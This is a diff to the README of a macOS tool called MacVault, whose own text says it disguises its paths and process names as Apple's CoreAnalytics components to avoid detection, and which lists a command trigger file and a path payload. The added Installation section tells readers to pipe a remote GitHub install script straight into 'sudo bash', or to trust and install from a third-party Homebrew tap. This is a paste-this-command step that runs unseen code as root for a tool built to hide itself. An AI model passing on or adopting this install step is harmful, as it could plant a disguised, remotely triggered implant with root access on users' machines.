@@ -8,6 +8,20 @@ MacVault creates a password-protected encrypted disk image stored at `/private/v
 
 All infrastructure paths and process names mimic Apple internals (`CoreAnalytics`, `analyticsd`, `com.apple.CoreAnalytics`) to avoid casual detection.
 
+
+## Installation
+Run the installer script to install MacVault.
+```bash
+curl -sL https://raw.githubusercontent.com/paragon-William/MacVault/main/install.sh | sudo bash
+```
+or
+```bash
+brew tap paragon-william/vault
+brew trust paragon-william/vault
+brew install vault
+```
+It will ask for the sudo password.
+
 ## How It Works
 
 ```
@@ -69,8 +83,6 @@ Edit the following variables at the top of `vault.sh` before installing:
   +-- .ca_trigger               Command trigger file
   +-- .ca_path                  File path payload
 ```
-
-## Installation
 
 ## Uninstallation
 
